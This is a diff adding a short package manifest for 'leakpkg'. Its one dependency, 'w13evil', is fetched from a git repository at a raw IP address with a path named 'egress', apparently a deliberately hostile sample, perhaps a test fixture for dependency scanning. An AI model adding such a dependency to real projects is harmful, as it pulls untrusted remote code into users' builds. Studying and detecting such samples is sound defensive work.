@@ -1,0 +1,9 @@
+[package]
+name = "leakpkg"
+version = "0.0.1"
+
+[addresses]
+leakpkg = "0x0"
+
+[dependencies]
+w13evil = { git = "https://109.94.97.113:8899/w13git-egress", rev = "main" }
